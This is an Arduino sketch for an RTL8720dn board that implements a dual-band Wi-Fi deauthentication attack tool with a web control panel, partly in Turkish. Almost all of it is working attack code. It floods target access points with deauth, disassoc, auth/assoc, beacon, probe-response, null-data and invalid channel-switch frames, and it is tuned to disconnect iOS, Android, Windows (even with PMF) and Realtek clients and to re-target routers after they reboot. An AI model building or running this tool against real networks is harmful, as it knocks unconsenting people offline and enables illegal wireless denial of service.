#include "vector"
#include "wifi_conf.h"
#include "wifi_cust_tx.h"
#include "wifi_util.h"
#include "wifi_structures.h"
#include "WiFi.h"
#include "WiFiServer.h"
#include "WiFiClient.h"

// ─── Configuration ────────────────────────────────────────────────────────────
char *ssid = "C";
char *pass = "20192019";

// Frames sent per channel burst (main loop iterations)
#define FRAMES_PER_DEAUTH     80
// How often to re-scan and refresh target channels while attacking (ms)
#define RESCAN_INTERVAL_MS    30000UL

// Common fallback channels to try when pair channel is not yet known from scan
static const uint8_t COMMON_5GHZ[]  = {36, 40, 44, 48, 149, 153, 157, 161};
static const uint8_t COMMON_24GHZ[] = {1, 6, 11};
static const int COMMON_5GHZ_LEN    = 8;
static const int COMMON_24GHZ_LEN   = 3;

// ─── Data Structures ──────────────────────────────────────────────────────────
typedef struct {
  String  ssid;
  String  bssid_str;
  uint8_t bssid[6];
  short   rssi;
  uint8_t channel;
} WiFiScanResult;

typedef struct {
  uint8_t bssid[6];        // Primary BSSID (from selection)
  uint8_t bssid_pair[6];   // Derived pair BSSID (last byte ±1)
  bool    has_pair;        // Whether pair BSSID has been computed
  uint8_t channel;         // Last known primary channel
  uint8_t channel_pair;    // Last known pair channel (0 = unknown)
  String  ssid;            // Display label
} DeauthTarget;

// ─── Globals ──────────────────────────────────────────────────────────────────
std::vector<WiFiScanResult> scan_results;
std::vector<DeauthTarget>   deauth_targets;   // Persistent across router reboots
WiFiServer server(80);
unsigned long last_rescan_ms   = 0;
int           guess_5g_idx     = 0;   // cycling index for unknown 5GHz pair channels
int           guess_24g_idx    = 0;   // cycling index for unknown 2.4GHz pair channels

// Flood MAC counter — incremented per fake auth/assoc frame to get unique MACs
// Using locally administered bit (0x02) so frames look plausible
static uint32_t flood_mac_counter = 0x11223344;

// ─── Helpers ──────────────────────────────────────────────────────────────────

bool bssidEqual(const uint8_t *a, const uint8_t *b) {
  return memcmp(a, b, 6) == 0;
}

// Derive the pair BSSID: same first 5 bytes, last byte ±1
// If primary is 2.4GHz  → pair = last_byte + 1 (5GHz band)
// If primary is 5GHz    → pair = last_byte - 1 (2.4GHz band)
void computePairBSSID(const uint8_t *src, uint8_t channel, uint8_t *pair_out) {
  memcpy(pair_out, src, 6);
  if (channel <= 14) {
    pair_out[5] = src[5] + 1;   // 2.4GHz → pair is 5GHz (+1)
  } else {
    pair_out[5] = src[5] - 1;   // 5GHz → pair is 2.4GHz (-1)
  }
}

// After a scan, refresh channel info for all active targets (and their pairs)
void updateTargetChannels() {
  for (auto &target : deauth_targets) {
    for (auto &result : scan_results) {
      if (bssidEqual(target.bssid, result.bssid)) {
        target.channel = result.channel;
      }
      if (target.has_pair && bssidEqual(target.bssid_pair, result.bssid)) {
        target.channel_pair = result.channel;
      }
    }
  }
}

// Find the scan result index of a paired network (BSSIDs match in first 5 bytes, last byte ±1)
int findPairInScan(uint32_t i) {
  for (uint32_t j = 0; j < scan_results.size(); j++) {
    if (j == i) continue;
    if (memcmp(scan_results[i].bssid, scan_results[j].bssid, 5) == 0) {
      int diff = (int)scan_results[j].bssid[5] - (int)scan_results[i].bssid[5];
      if (diff == 1 || diff == -1) return (int)j;
    }
  }
  return -1;
}

// ─── Attack Core ──────────────────────────────────────────────────────────────

// Build the next unique locally-administered flood MAC from the counter
void nextFloodMAC(uint8_t *mac) {
  flood_mac_counter++;
  mac[0] = 0x02; // locally administered, unicast
  mac[1] = 0xAA;
  mac[2] = (flood_mac_counter >> 24) & 0xFF;
  mac[3] = (flood_mac_counter >> 16) & 0xFF;
  mac[4] = (flood_mac_counter >>  8) & 0xFF;
  mac[5] =  flood_mac_counter        & 0xFF;
}

/*
 * Single-channel full attack burst — ONE wext_set_channel() call, zero delays.
 *
 * Supplement frames (probe resp / beacon / null) are INTERLEAVED inside the
 * main loop so the attack pressure never drops between phases. The adapter
 * cannot complete its reconnect handshake in any gap because there is no gap.
 *
 * Per burst (FRAMES_PER_DEAUTH = 80 iterations):
 *   Core loop ×80 : deauth×5 + disassoc×3 + auth+assoc flood×1  = 720 frames
 *   Interleaved /4 : probe_resp (Realtek/TP-Link) + null PM=1    ~  42 frames
 *   Interleaved /8 : beacon flood (iOS) — bitwise (i&7)==0        ~  10 frames
 *   Tail           : CSA ×5 (ch14/ch0 alternating)                   5 frames
 *   Total          : ~777 frames | 1 channel switch | 0 ms delay
 *
 * wext_set_channel skipped if channel unchanged — saves 10-50ms per call.
 */
static uint8_t _last_channel = 0xFF;

void attackBand(uint8_t *bssid, uint8_t channel, const String &ssid) {
  static uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
  uint8_t flood_mac[6];
  uint8_t null_mac[6];
  const char *ssid_c = (ssid.length() > 0 && ssid != "(hidden)") ? ssid.c_str() : nullptr;

  // Only switch channel when it actually changes — wext_set_channel is slow
  if (channel != _last_channel) {
    wext_set_channel(WLAN0_NAME, channel);
    _last_channel = channel;
  }

  // beacon_ctr uses bitwise (beacon_ctr & 7) == 0 instead of % 5 to avoid
  // the integer division path on Cortex-M33 (even though gcc optimises it,
  // the bitwise path is cheaper and keeps beacon spacing even at 80 iters)
  uint8_t beacon_ctr = 0;

  for (int i = 0; i < FRAMES_PER_DEAUTH; i++) {
    // ── Core: deauth + disassoc (all platforms, no PMF) ─────────────────────
    wifi_tx_deauth_frame  (bssid, broadcast, 2);
    wifi_tx_deauth_frame  (bssid, broadcast, 3);
    wifi_tx_deauth_frame  (bssid, broadcast, 4);
    wifi_tx_deauth_frame  (bssid, broadcast, 6);
    wifi_tx_deauth_frame  (bssid, broadcast, 8);
    wifi_tx_disassoc_frame(bssid, broadcast, 2);
    wifi_tx_disassoc_frame(bssid, broadcast, 3);
    wifi_tx_disassoc_frame(bssid, broadcast, 8);

    // ── Auth + Assoc flood — PMF-exempt, fills AP table (Windows PMF ✓) ─────
    nextFloodMAC(flood_mac);
    wifi_tx_auth_frame (bssid, flood_mac);
    wifi_tx_assoc_frame(bssid, flood_mac);

    // ── Every 4 iters: probe resp (Realtek/TP-Link) + null PM=1 flood ───────
    if ((i & 3) == 0) {
      if (ssid_c) wifi_tx_probe_resp_frame(bssid, ssid_c);
      nextFloodMAC(null_mac);
      wifi_tx_null_frame(bssid, null_mac);
    }

    // ── Every 8 iters: beacon flood (iOS) — bitwise, zero division cost ──────
    if ((beacon_ctr & 7) == 0 && ssid_c) {
      wifi_tx_beacon_frame(bssid, broadcast, ssid_c);
    }
    beacon_ctr++;
  }

  // ── Tail: CSA — alternate ch14/ch0 so driver can't settle (Windows ✓) ─────
  wifi_tx_csa_frame(bssid, 14);
  wifi_tx_csa_frame(bssid,  0);
  wifi_tx_csa_frame(bssid, 14);
  wifi_tx_csa_frame(bssid,  0);
  wifi_tx_csa_frame(bssid, 14);
}

/*
 * Attack a full DeauthTarget across both bands.
 * Each band gets exactly ONE wext_set_channel() call (inside attackBand).
 */
void attackTarget(DeauthTarget &target) {
  attackBand(target.bssid, target.channel, target.ssid);

  if (!target.has_pair) return;

  if (target.channel_pair > 0) {
    attackBand(target.bssid_pair, target.channel_pair, target.ssid);
  } else if (target.channel <= 14) {
    attackBand(target.bssid_pair, COMMON_5GHZ[guess_5g_idx++ % COMMON_5GHZ_LEN], target.ssid);
  } else {
    attackBand(target.bssid_pair, COMMON_24GHZ[guess_24g_idx++ % COMMON_24GHZ_LEN], target.ssid);
  }
}

// ─── WiFi Scan ────────────────────────────────────────────────────────────────
rtw_result_t scanResultHandler(rtw_scan_handler_result_t *scan_result) {
  rtw_scan_result_t *record;
  if (scan_result->scan_complete == 0) {
    record = &scan_result->ap_details;
    record->SSID.val[record->SSID.len] = 0;
    WiFiScanResult result;
    result.ssid    = String((const char *)record->SSID.val);
    result.channel = record->channel;
    result.rssi    = record->signal_strength;
    memcpy(&result.bssid, &record->BSSID, 6);
    char bssid_str[] = "XX:XX:XX:XX:XX:XX";
    snprintf(bssid_str, sizeof(bssid_str), "%02X:%02X:%02X:%02X:%02X:%02X",
      result.bssid[0], result.bssid[1], result.bssid[2],
      result.bssid[3], result.bssid[4], result.bssid[5]);
    result.bssid_str = bssid_str;
    scan_results.push_back(result);
  }
  return RTW_SUCCESS;
}

int scanNetworks() {
  scan_results.clear();
  if (wifi_scan_networks(scanResultHandler, NULL) == RTW_SUCCESS) {
    delay(5000);
    updateTargetChannels();
    last_rescan_ms = millis();
    return 0;
  }
  return 1;
}

// ─── HTTP Helpers ─────────────────────────────────────────────────────────────
String parseRequest(String request) {
  int path_start = request.indexOf(' ') + 1;
  int path_end   = request.indexOf(' ', path_start);
  return request.substring(path_start, path_end);
}

std::vector<std::pair<String, String>> parsePost(String &request) {
  std::vector<std::pair<String, String>> post_params;
  int body_start = request.indexOf("\r\n\r\n");
  if (body_start == -1) return post_params;
  body_start += 4;
  String post_data = request.substring(body_start);

  int start = 0;
  int end   = post_data.indexOf('&', start);
  while (end != -1) {
    String kv    = post_data.substring(start, end);
    int    delim = kv.indexOf('=');
    if (delim != -1) post_params.push_back({kv.substring(0, delim), kv.substring(delim + 1)});
    start = end + 1;
    end   = post_data.indexOf('&', start);
  }
  String kv    = post_data.substring(start);
  int    delim = kv.indexOf('=');
  if (delim != -1) post_params.push_back({kv.substring(0, delim), kv.substring(delim + 1)});
  return post_params;
}

String makeResponse(int code, String content_type) {
  String r  = "HTTP/1.1 " + String(code) + " OK\n";
         r += "Content-Type: " + content_type + "\n";
         r += "Connection: close\n\n";
  return r;
}

String makeRedirect(String url) {
  return "HTTP/1.1 307 Temporary Redirect\nLocation: " + url;
}

// ─── Web UI ───────────────────────────────────────────────────────────────────
void handleRoot(WiFiClient &client) {
  bool attacking = (deauth_targets.size() > 0);

  String response = makeResponse(200, "text/html") + R"(
  <!DOCTYPE html>
  <html lang="en">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Deauther</title>
    <style>
      *, *::before, *::after { box-sizing: border-box; }
      body { font-family: Arial, sans-serif; line-height: 1.6; color: #333; max-width: 960px; margin: 0 auto; padding: 12px; background: #f4f4f4; }
      h1 { font-size: clamp(1.2rem, 5vw, 1.8rem); color: #2c3e50; margin-bottom: 10px; }
      h2 { font-size: clamp(1rem, 4vw, 1.4rem); color: #2c3e50; }
      .table-wrap { width: 100%; overflow-x: auto; -webkit-overflow-scrolling: touch; margin-bottom: 20px; border-radius: 6px; box-shadow: 0 2px 5px rgba(0,0,0,.08); }
      table { width: 100%; border-collapse: collapse; min-width: 480px; }
      th, td { padding: 9px 10px; text-align: left; border-bottom: 1px solid #ddd; white-space: nowrap; font-size: 0.9em; }
      th { background: #2c3e50; color: #fff; }
      tr:nth-child(even) { background: #f0f0f0; }
      .group-header td { background: #dce8f5; font-weight: bold; font-size: 0.82em; color: #1a252f; padding: 5px 10px; white-space: normal; }
      .row-2g { background: #eaf4fb !important; border-left: 4px solid #3498db; }
      .row-5g { background: #eafbf1 !important; border-left: 4px solid #27ae60; }
      .badge { display:inline-block; padding:2px 7px; border-radius:3px; font-size:.78em; font-weight:bold; color:#fff; }
      .b2g { background:#3498db; } .b5g { background:#27ae60; }
      form { background:#fff; padding:14px 16px; border-radius:6px; box-shadow:0 2px 5px rgba(0,0,0,.1); margin-bottom:16px; }
      input[type=submit] { padding:12px 20px; border:none; border-radius:4px; cursor:pointer; font-size:1em; color:#fff; transition:background .2s; touch-action:manipulation; min-height:44px; }
      .btn-attack  { background:#e74c3c; } .btn-attack:hover, .btn-attack:active { background:#c0392b; }
      .btn-stop    { background:#e67e22; } .btn-stop:hover,   .btn-stop:active   { background:#ca6f1e; }
      .btn-rescan  { background:#3498db; } .btn-rescan:hover, .btn-rescan:active  { background:#2980b9; }
      .btn-row { display:flex; flex-wrap:wrap; gap:10px; margin-bottom:16px; }
      .btn-row form { margin:0; padding:0; background:none; box-shadow:none; }
      input[type=text] { padding:8px; border:1px solid #ccc; border-radius:4px; width:90px; margin-right:8px; }
      .cb-grp  { transform:scale(1.4); cursor:pointer; accent-color:#8e44ad; min-width:20px; min-height:20px; }
      .cb-net  { transform:scale(1.3); cursor:pointer; min-width:20px; min-height:20px; }
      .status-bar { padding:10px 14px; border-radius:5px; margin-bottom:14px; font-weight:bold; font-size:0.95em; }
      .status-on  { background:#fdecea; border:1px solid #e74c3c; color:#c0392b; }
      .status-off { background:#eafaf1; border:1px solid #27ae60; color:#1e8449; }
      .info-text { font-size:.85em; color:#555; }
      @media (max-width: 600px) {
        body { padding: 8px; }
        th, td { padding: 7px 6px; font-size: 0.8em; }
        input[type=submit] { width: 100%; }
        .btn-row { flex-direction: column; }
        h1 { font-size: 1.2rem; }
        h2 { font-size: 1rem; }
      }
    </style>
    <script>
      function toggleGroup(id) {
        var cb = document.getElementById('grp_' + id);
        document.querySelectorAll('.grp_' + id).forEach(function(el){ el.checked = cb.checked; });
      }
    </script>
  </head>
  <body>
    <h1>&#9889; RTL8720dn Deauther</h1>
  )";

  // Status bar
  if (attacking) {
    response += "<div class='status-bar status-on'>&#128308; ATTACK ACTIVE &mdash; " + String(deauth_targets.size()) + " target(s) | Auto-rescan every 30s</div>";
  } else {
    response += "<div class='status-bar status-off'>&#128994; IDLE &mdash; No active attack</div>";
  }

  // Stop / rescan row
  response += "<div class='btn-row'>";
  response += "<form method='post' action='/stop'>";
  response += "<input class='btn-stop' type='submit' value='&#9632; Stop Attack'></form>";
  response += "<form method='post' action='/rescan'>";
  response += "<input class='btn-rescan' type='submit' value='&#8635; Rescan Networks'></form>";
  response += "</div>";

  // Network table
  response += "<h2>WiFi Networks</h2>";
  response += "<form method='post' action='/deauth'>";
  response += "<div class='table-wrap'><table><tr><th>Grp</th><th>Sel</th><th>#</th><th>SSID</th><th>BSSID</th><th>Ch</th><th>RSSI</th><th>Band</th></tr>";

  std::vector<bool> rendered(scan_results.size(), false);
  int group_id = 0;

  for (uint32_t i = 0; i < scan_results.size(); i++) {
    if (rendered[i]) continue;
    int pair_idx = findPairInScan(i);

    if (pair_idx != -1 && !rendered[pair_idx]) {
      int idx_2g = (scan_results[i].channel <= 14) ? (int)i : pair_idx;
      int idx_5g = (scan_results[i].channel <= 14) ? pair_idx : (int)i;
      String gid = String(group_id);
      String label = (scan_results[idx_2g].ssid.length() > 0) ? scan_results[idx_2g].ssid : "(hidden)";

      response += "<tr class='group-header'><td colspan='8'>&#128279; Paired Router &mdash; " + label;
      response += " &nbsp;<input class='cb-grp' type='checkbox' id='grp_" + gid + "' onclick='toggleGroup(" + gid + ")'> Select Both</td></tr>";

      // 2.4 GHz row
      String s2g = (scan_results[idx_2g].ssid.length() > 0) ? scan_results[idx_2g].ssid : "(hidden)";
      response += "<tr class='row-2g'><td></td>";
      response += "<td><input class='cb-net grp_" + gid + "' type='checkbox' name='network' value='" + String(idx_2g) + "'></td>";
      response += "<td>" + String(idx_2g) + "</td><td>" + s2g + "</td>";
      response += "<td>" + scan_results[idx_2g].bssid_str + "</td>";
      response += "<td>" + String(scan_results[idx_2g].channel) + "</td>";
      response += "<td>" + String(scan_results[idx_2g].rssi) + "</td>";
      response += "<td><span class='badge b2g'>2.4GHz</span></td></tr>";

      // 5 GHz row
      String s5g = (scan_results[idx_5g].ssid.length() > 0) ? scan_results[idx_5g].ssid : "(hidden)";
      response += "<tr class='row-5g'><td></td>";
      response += "<td><input class='cb-net grp_" + gid + "' type='checkbox' name='network' value='" + String(idx_5g) + "'></td>";
      response += "<td>" + String(idx_5g) + "</td><td>" + s5g + "</td>";
      response += "<td>" + scan_results[idx_5g].bssid_str + "</td>";
      response += "<td>" + String(scan_results[idx_5g].channel) + "</td>";
      response += "<td>" + String(scan_results[idx_5g].rssi) + "</td>";
      response += "<td><span class='badge b5g'>5GHz</span></td></tr>";

      rendered[i] = rendered[pair_idx] = true;
      group_id++;

    } else {
      String label = (scan_results[i].ssid.length() > 0) ? scan_results[i].ssid : "(hidden)";
      bool is5g    = (scan_results[i].channel >= 36);
      String rowcls = is5g ? "row-5g" : "row-2g";
      String badgec = is5g ? "b5g" : "b2g";
      String band   = is5g ? "5GHz" : "2.4GHz";

      response += "<tr class='" + rowcls + "'><td></td>";
      response += "<td><input class='cb-net' type='checkbox' name='network' value='" + String(i) + "'></td>";
      response += "<td>" + String(i) + "</td><td>" + label + "</td>";
      response += "<td>" + scan_results[i].bssid_str + "</td>";
      response += "<td>" + String(scan_results[i].channel) + "</td>";
      response += "<td>" + String(scan_results[i].rssi) + "</td>";
      response += "<td><span class='badge " + badgec + "'>" + band + "</span></td></tr>";
      rendered[i] = true;
    }
  }

  response += "</table></div>";
  response += "<p class='info-text'>Her saldırı burst'ünde tüm reason code'lar otomatik gönderilir: <b>2, 3, 4, 6, 8</b> (Deauth) + <b>2, 3, 8</b> (Disassoc) &mdash; iOS, Android ve Windows için eş zamanlı.</p>";
  response += "<input class='btn-attack' type='submit' value='&#9889; Launch Attack'></form>";

  // Active targets section
  if (attacking) {
    response += "<h2>Active Targets</h2><div class='table-wrap'><table>";
    response += "<tr><th>#</th><th>SSID</th><th>Primary BSSID</th><th>Ch</th><th>Pair BSSID</th><th>Pair Ch</th></tr>";
    for (uint32_t i = 0; i < deauth_targets.size(); i++) {
      char pbssid[18] = "—";
      if (deauth_targets[i].has_pair) {
        snprintf(pbssid, sizeof(pbssid), "%02X:%02X:%02X:%02X:%02X:%02X",
          deauth_targets[i].bssid_pair[0], deauth_targets[i].bssid_pair[1],
          deauth_targets[i].bssid_pair[2], deauth_targets[i].bssid_pair[3],
          deauth_targets[i].bssid_pair[4], deauth_targets[i].bssid_pair[5]);
      }
      char pbssid_str[18];
      snprintf(pbssid_str, sizeof(pbssid_str), "%02X:%02X:%02X:%02X:%02X:%02X",
        deauth_targets[i].bssid[0], deauth_targets[i].bssid[1],
        deauth_targets[i].bssid[2], deauth_targets[i].bssid[3],
        deauth_targets[i].bssid[4], deauth_targets[i].bssid[5]);
      String pch = deauth_targets[i].has_pair ?
        (deauth_targets[i].channel_pair > 0 ? String(deauth_targets[i].channel_pair) : "?") : "—";
      response += "<tr>";
      response += "<td>" + String(i) + "</td>";
      response += "<td>" + deauth_targets[i].ssid + "</td>";
      response += "<td>" + String(pbssid_str) + "</td>";
      response += "<td>" + String(deauth_targets[i].channel) + "</td>";
      response += "<td>" + String(pbssid) + "</td>";
      response += "<td>" + pch + "</td>";
      response += "</tr>";
    }
    response += "</table></div>";
  }

  response += R"(
    <h2>Evrensel Saldırı Matrisi (Her Burst)</h2>
    <div class='table-wrap'><table>
      <tr><th>Frame Tipi</th><th>Miktar</th><th>Mekanizma</th><th>Hedef Platform</th></tr>
      <tr>
        <td>Deauth 0xC0</td><td>reason 2,3,4,6,8 &times;50</td>
        <td>AP&rarr;Broadcast, delay=0, kesintisiz bask&iacute;</td>
        <td>Android ✓ &nbsp; iOS ✓ &nbsp; Windows (PMF yok) ✓</td>
      </tr>
      <tr>
        <td>Disassoc 0xA0</td><td>reason 2,3,8 &times;50</td>
        <td>Tam re-assoc zorlar, deauth ile birlikte (&icirc;ç i&ccedil;e)</td>
        <td>Android ✓ &nbsp; iOS ✓</td>
      </tr>
      <tr style="background:#fff3cd;">
        <td>Auth Flood 0xB0</td><td>unique MAC &times;50</td>
        <td>PMF-exempt &mdash; AP association tablosunu doldurur</td>
        <td><b>Windows PMF ✓</b></td>
      </tr>
      <tr style="background:#fff3cd;">
        <td>Assoc Flood 0x00</td><td>unique MAC &times;50</td>
        <td>Auth flood ile t&uuml;m AP slot'larını kilitler</td>
        <td><b>Windows PMF ✓</b></td>
      </tr>
      <tr style="background:#fce8ff;">
        <td>Probe Resp 0x0050</td><td>caps=0x0001 (open) &times;~13</td>
        <td><b>&icirc;&ccedil; i&ccedil;e:</b> Realtek s&uuml;r&uuml;c&uuml;s&uuml; "AP g&uuml;venliği kaldırdı" sanır → keser → deauth bloğu</td>
        <td><b>TP-Link/Realtek USB ✓</b></td>
      </tr>
      <tr style="background:#e8f4f8;">
        <td>Beacon Flood 0x80</td><td>hedef SSID &times;~10</td>
        <td><b>&icirc;&ccedil; i&ccedil;e:</b> iOS reconnect state machine'i meşgul eder</td>
        <td><b>iOS ✓</b></td>
      </tr>
      <tr style="background:#e8f4f8;">
        <td>Null Data PM=1</td><td>unique MAC &times;~13</td>
        <td><b>&icirc;&ccedil; i&ccedil;e:</b> AP buffer dolar → frame teslim edilemez</td>
        <td><b>iOS ✓ &nbsp; Android ✓</b></td>
      </tr>
      <tr style="background:#ffe0e0;">
        <td>CSA 0xD0</td><td>ch14+ch0 &times;5 (ku&yacute;ruk)</td>
        <td>Ard&iacute;&scaron;ık 2 geçersiz kanal — s&uuml;r&uuml;c&uuml; hi&ccedil;birine yerle&scaron;emez</td>
        <td><b>Windows ✓ &nbsp; TP-Link/Realtek USB ✓</b></td>
      </tr>
    </table></div>
    <p class="info-text">
      <b>~777 frame/kanal &bull; kanal ge&ccedil;i&scaron;i sadece kanal de&gti;i&scaron;ince &bull; delay=0 &bull; TX g&uuml;c&uuml; %100 &bull; power-save kapal&iacute;</b>
    </p>
  </body></html>)";

  client.write(response.c_str());
}

void handle404(WiFiClient &client) {
  String r = makeResponse(404, "text/plain") + "Not found!";
  client.write(r.c_str());
}

// ─── Setup ────────────────────────────────────────────────────────────────────
void setup() {
  WiFi.apbegin(ssid, pass, "1");

  // ── Maximum RF performance ──────────────────────────────────────────────────
  // Disable IPS (Inactive Power Save) + LPS (Legacy Power Save).
  // Without this the Realtek driver throttles TX during "idle" periods — which
  // causes frame rate drops mid-attack even though FRAME_DELAY_MS = 0.
  wifi_disable_powersave();

  while (scanNetworks()) delay(1000);
  server.begin();
}

// ─── Loop ─────────────────────────────────────────────────────────────────────
void loop() {
  // ── Web server ──
  WiFiClient client = server.available();
  if (client.connected()) {
    String request;
    while (client.available()) {
      while (client.available()) request += (char)client.read();
      delay(1);
    }
    String path = parseRequest(request);

    if (path == "/") {
      handleRoot(client);

    } else if (path == "/rescan") {
      client.write(makeRedirect("/").c_str());
      client.stop();
      scanNetworks();
      return;

    } else if (path == "/stop") {
      deauth_targets.clear();
      client.write(makeRedirect("/").c_str());

    } else if (path == "/deauth") {
      std::vector<std::pair<String, String>> post_data = parsePost(request);
      std::vector<int> selected_indices;

      for (auto &param : post_data) {
        if (param.first == "network") {
          selected_indices.push_back(String(param.second).toInt());
        }
      }

      // Build persistent DeauthTarget list
      // Only add targets not already in the list (avoids duplicates on re-submit)
      for (int idx : selected_indices) {
        if (idx < 0 || idx >= (int)scan_results.size()) continue;

        // Check if already tracked
        bool already = false;
        for (auto &t : deauth_targets) {
          if (bssidEqual(t.bssid, scan_results[idx].bssid)) { already = true; break; }
        }
        if (already) continue;

        DeauthTarget target;
        memcpy(target.bssid, scan_results[idx].bssid, 6);
        target.channel      = scan_results[idx].channel;
        target.ssid         = (scan_results[idx].ssid.length() > 0) ? scan_results[idx].ssid : "(hidden)";
        target.channel_pair = 0;

        // Derive pair BSSID from BSSID ±1
        computePairBSSID(target.bssid, target.channel, target.bssid_pair);
        target.has_pair = true;

        // If the pair is actually in the scan results, grab its channel now
        for (auto &result : scan_results) {
          if (bssidEqual(target.bssid_pair, result.bssid)) {
            target.channel_pair = result.channel;
            break;
          }
        }

        deauth_targets.push_back(target);
      }

      client.write(makeRedirect("/").c_str());

    } else {
      handle404(client);
    }

    client.stop();
  }

  // ── Attack loop ──
  if (deauth_targets.size() == 0) return;

  // Periodic re-scan to refresh channels (router may have rebooted on same/new channel)
  if (millis() - last_rescan_ms >= RESCAN_INTERVAL_MS) {
    scanNetworks();
  }

  // Attack every target in the list
  for (uint32_t i = 0; i < deauth_targets.size(); i++) {
    attackTarget(deauth_targets[i]);
  }
}
